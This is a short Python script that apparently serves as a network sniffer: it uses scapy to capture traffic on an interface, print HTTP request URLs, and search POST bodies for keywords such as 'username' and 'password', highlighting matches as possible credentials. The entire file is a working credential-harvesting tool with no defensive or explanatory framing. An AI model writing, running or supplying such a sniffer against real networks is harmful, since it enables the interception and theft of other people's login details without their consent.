#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"[+] HTTP Request >> {url}")
        if packet.haslayer(scapy.Raw) and packet[http.HTTPRequest].Method.decode() == 'POST':
            load = packet[scapy.Raw].load.decode(errors='ignore')  # decode from bytes to string
            keywords = {"username", "user", "uname", "login", "password", "pass", "email", "e-mail", "mail"}
            for keyword in keywords:
                if keyword in load:
                    print(f"\033[91m\n\n[+] Possible username/password > {load}\n\n\033[0m")
                    break

sniff("eth0")